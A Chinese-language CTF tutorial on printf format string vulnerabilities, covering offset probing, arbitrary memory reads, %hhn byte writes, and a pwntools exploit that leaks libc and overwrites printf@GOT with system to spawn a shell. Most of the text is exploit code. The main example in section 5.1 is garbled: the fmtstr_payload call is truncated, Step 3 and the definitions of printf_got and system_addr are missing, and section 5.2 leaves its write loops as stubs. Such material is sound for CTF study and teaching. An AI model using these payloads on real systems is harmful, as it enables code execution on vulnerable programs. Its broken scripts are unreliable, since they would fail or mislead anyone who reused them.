# 格式化字符串漏洞：泄露 / 任意地址写 / GOT覆写

## 1. 概述

格式化字符串漏洞源于`printf`、`sprintf`、`fprintf`系列函数在缺少格式化参数（如`printf(buf)`而非`printf("%s", buf)`）时，允许攻击者通过精心构造的格式化字符串实现内存泄露和任意地址写入。

在CTF断网离线环境下，格式化字符串是绕过ASLR/PIE泄露地址最直接的途径，也是无栈溢出时实现代码执行的重要手段。

## 2. 核心原理

### 2.1 参数在栈上的位置

```c
// 漏洞代码
char buf[100];
read(0, buf, 100);
printf(buf);  // 直接使用用户输入作为格式化字符串！
```

`printf`解析格式字符串时，根据ABI从寄存器+栈上读取参数：
- 64位：前6个参数在rdi(格式串本身)、rsi、rdx、rcx、r8、r9，第7个起在栈上
- 32位：所有参数在栈上（可通过栈偏移%n$直接访问）

### 2.2 格式化字符速查

| 格式化符 | 功能 | 利用价值 |
|---------|------|---------|
| `%p` | 输出指针值（8字节hex） | 泄露内存内容 |
| `%s` | 输出字符串（从指针地址读） | 泄露任意地址内容 |
| `%n` | **写入已输出字符数到指针** | 任意地址写入 |
| `%hn` | 写入2字节（short） | 部分覆写（分两半写） |
| `%hhn` | 写入1字节（byte） | 逐字节覆写（最精准） |
| `%x` | 十六进制输出 | 泄露栈上数据 |
| `%lx` | 长十六进制（64位） | 泄露栈上数据 |
| `%N$p` | 输出第N个参数 | 跳过寄存器，直达栈上特定偏移 |
| `%Nc` | 输出N个字符 | 控制%n写入的数值 |

### 2.3 利用流程

```
1. 确定偏移：发送 AAAA%p.%p.%p... 找到 AAAA(0x41414141) 出现在第几个%p
2. 泄露地址：%N$p 泄露栈上的libc/PIE返回地址
3. 任意写：%N$hhn 逐字节覆写GOT表项
4. 触发调用：下次调用被覆写的函数时即执行system等
```

## 3. 关键技巧/检测方法

### 3.1 偏移探测脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""格式化字符串偏移自动探测"""
from pwn import *

def find_fmt_offset(p, max_offset=30):
    """
    自动探测printf参数偏移
    发送 AAAA + %N$p 序列，寻找 0x41414141 出现的位置
    """
    for i in range(1, max_offset + 1):
        p = process('./target')
        payload = f'AAAA%{i}$p'.encode()
        try:
            p.sendline(payload)
            resp = p.recvline(timeout=2)
            log.info(f'Offset {i:2d}: {resp.strip()}')
            if b'41414141' in resp:
                log.success(f'Found offset at {i}!')
                p.close()
                return i
        except:
            pass
        p.close()
    return None

# 手动方法
p = process('./fmt')
p.sendline(b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
# 观察输出中 0x41414141 在第几个位置
p.interactive()
```

### 3.2 任意地址读（%s技巧）

```python
def arbitrary_read(addr, offset):
    """
    通过%N$s实现任意地址读
    前提：目标地址不能包含\x00（printf遇到\x00截断）
    """
    payload = p64(addr)           # 地址放开头
    payload += f'%{offset}$s'.encode()  # 读取该地址指向的字符串
    # 注意：如果地址含\x00，需将地址放在payload末尾
    return payload

# 地址含\x00的变通方案（地址放末尾）
def arbitrary_read_v2(addr, offset, addr_pos_offset):
    """
    将地址放在payload末尾，用fmtstr中的位置参数引用
    addr_pos_offset: 地址在payload中的参数位置
    """
    payload = f'%{offset}$s'.encode().ljust(8, b'A')
    payload += p64(addr)
    return payload
```

### 3.3 单字节写入（%hhn）模板

```python
def byte_write(target_addr, value, offset):
    """
    单字节任意写（最精确，推荐）
    缺点：每个字节需单独一次printf调用
    """
    if value == 0:
        payload = f'%{offset}$hhn'.encode()
    else:
        payload = f'%{value}c%{offset}$hhn'.encode()
    payload = payload.ljust(16, b'A')  # 对齐到地址
    payload += p64(target_addr)
    return payload

# 完整覆写8字节的例子
def write_qword(target_addr, value, offset, p):
    """分8次写入，每次一个字节 (小端序)"""
    for i in range(8):
        byte_val = (value >> (i * 8)) & 0xFF
        payload = byte_write(target_addr + i, byte_val, offset)
        p.send(payload)
```

## 4. 常见误区与注意事项

1. **\x00截断**：printf在遇到`\x00`停止解析。将地址放末尾避开。
2. **写入顺序限制**：数值从小到大写，因为%n统计的是累计输出字符数
3. **超长输出**：`%100000c`产生大量输出可能超时，用`%hn`分两次写减少输出量
4. **pwntools fmtstr_payload限制**：自动生成的payload可能超出长度限制，需手动优化
5. **64位前6个参数在寄存器中**：`%1$p`是rsi，`%6$p`是r9，`%7$p`才到栈
6. **部分覆写**：One-byte溢出或仅改写低字节（不需要泄露完整地址）

## 5. 实战示例

### 5.1 完整利用：泄露libc + GOT覆写getshell

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
格式化字符串完整利用：
1. 泄露libc基址（通过栈上的__libc_start_main返回地址）
2. 覆写printf@GOT为system，下次调用printf("/bin/sh")即为system("/bin/sh")
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./fmt_vuln')
elf = ELF('./fmt_vuln')
# libc = ELF('./libc.so.6')  # 离线场景已知libc

# 假设64位，buffer在栈上，偏移为8（前5个在寄存器，buf从第6个参数开始
# 但考虑到栈布局差异，手动调试确定）

p.sendline(b'AAAA%6$p')  # 探测偏移
resp = p.recvline()
log.info(f'Probe: {resp}')
# 如果 0x41414141 出现在偏移6，则 offset=6

offset = 6  # 调试验证后的偏移

# ========== Step 2: 泄露栈上的libc地址 ==========
# 使用 %41$p 泄露 __libc_start_main+xxx 返回地址（偏移41需要gdb确认）
# 方法：在printf处下断点，看栈上何处有libc地址

# 发送泄露payload，需一次性完成泄露和覆写
# 先泄露，再循环回到main

# 假设栈上偏移35处有libc_start_main返回地址
p.sendline(b'%35$p')
leaked = int(p.recvline().strip(), 16)
log.info(f'Leaked __libc_start_main+: {hex(leaked)}')

# libc_start_main_offset = libc.symbols['__libc_start_main']
# libc_base = leaked - libc_start_main_offset - xxx  # xxx是返回偏移

libc_base = leaked - 0x270B3  # 示例偏移

    offset,                        # 格式化字符串偏移
    {printf_got: system_addr},     # {地址: 写入的值}
    write_size='byte'              # 逐字节写入(hhn)
)

log.info(f'Payload length: {len(payload)}')
p.sendline(payload)

# 方法B: 手动构造（更可控）
# 将printf@GOT每个字节分别写入system地址的对应字节
system_bytes = p64(system_addr)  # 小端序拆解
"""
for i, byte_val in enumerate(system_bytes):
    # 构造单个字节写入
    printf_got_i = printf_got + i
    # 需要按数值递增顺序写入，否则%n统计不对
    pass
"""

# ========== Step 4: 触发 system("/bin/sh") ==========
# 此时 printf@GOT 已指向 system
# 下次调用 printf 只要第一个参数指向 "/bin/sh" 即可
p.sendline(b'/bin/sh\x00')
p.interactive()
```

### 5.2 手动逐字节覆写（绕过长度限制）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
手动逐字节覆写GOT - 适用于payload长度受限或需要对字节写入精确控制
"""
from pwn import *

context.arch = 'amd64'

p = process('./fmt_short')
elf = ELF('./fmt_short')
offset = 6

target_got = elf.got['puts']   # 覆写puts@GOT
target_value = 0x401176        # 后门函数地址

def do_fmt_write(addr, value, offset):
    """
    向addr写入单字节value
    注意：每次printf调用独立，但value计算基于累计输出
    """
    if value == 0:
        fmt = b'%8$hhn'
    else:
        fmt = f'%{value}c%8$hhn'.encode()
    # 对齐+目标地址
    payload = fmt + b'A' * (16 - len(fmt) % 16)
    payload += p64(addr)
    # 注意：64位payload中地址必须偏移对齐，否则%8$不一定指向正确位置
    # 计算addr在payload参数偏移
    return payload

# 分字节写入
value_bytes = p64(target_value)
for i, byte_val in enumerate(value_bytes):
    # 重新连接（每次printf后程序可能继续执行）
    p = process('./fmt_short')
    addr = target_got + i
    # 实际利用需要把所有字节写进一次调用中
    # 这里展示分批写的思路
    log.info(f'Writing {hex(byte_val)} to {hex(addr)}')

    # 实践中应一次printf完成所有写入
    pass

# ====== 一次性分段写入（推荐） ======
def manual_fmt_write(writes, offset):
    """
    writes: [(addr, value), ...] 按value从小到大排序
    利用%n累积计数特性
    """
    writes = sorted(writes, key=lambda x: x[1])  # 按写入值排序

    payload = b''
    prev_written = 0

    for addr, val in writes:
        diff = val - prev_written
        if diff < 0:
            diff += 0x100  # 溢出一圈
        if diff == 0:
            payload += f'%{offset}$hhn'.encode()
        else:
            payload += f'%{diff}c%{offset}$hhn'.encode()
        prev_written = val
        offset += 1  # 每个写入消耗一个参数位置

    # 注意：实际需要精确计算每个%hhn对应地址在栈上的位置
    return payload

p.interactive()
```

### 5.3 栈上无指针时的泄露技术

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
利用格式化字符串构造任意地址读
当栈上没有现成libc指针时，通过%*偏移逐层寻找
或利用partial overwrite替换低字节创建指针
"""
from pwn import *

context.arch = 'amd64'

# 技术1: 栈帧内链表遍历
# 通过 %p 序列打印栈内容，识别函数帧
# 函数帧中一定有 __libc_start_main 的返回地址

# 技术2: 部分覆写返回地址低字节
# 如果ASLR下地址高位不变，仅覆写低1-2字节即可重定向
def partial_overwrite_got(target_got, original_addr, target_addr):
    """
    仅覆写低2字节（利用ASLR低12位不变的特性）
    对于PIE: 低12位不变，16位对齐，可覆写至多2字节安全
    """
    low2 = target_addr & 0xFFFF  # 取低2字节
    return p16(low2)
```

## 6. 相关知识点

- **栈溢出 + 格式化字符串**：先用fmt泄露地址，再用溢出getshell
- **PIE绕过**：fmt泄露code段地址，计算基址后ROP
- **GOT/PLT深入理解**：见 01-栈溢出基础.md 和 04-堆利用基础.md
- **pwntools fmtstr模块**：`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`
- **限制环境利用**：纯格式化字符串无循环时，考虑改写`__malloc_hook`/`__free_hook`
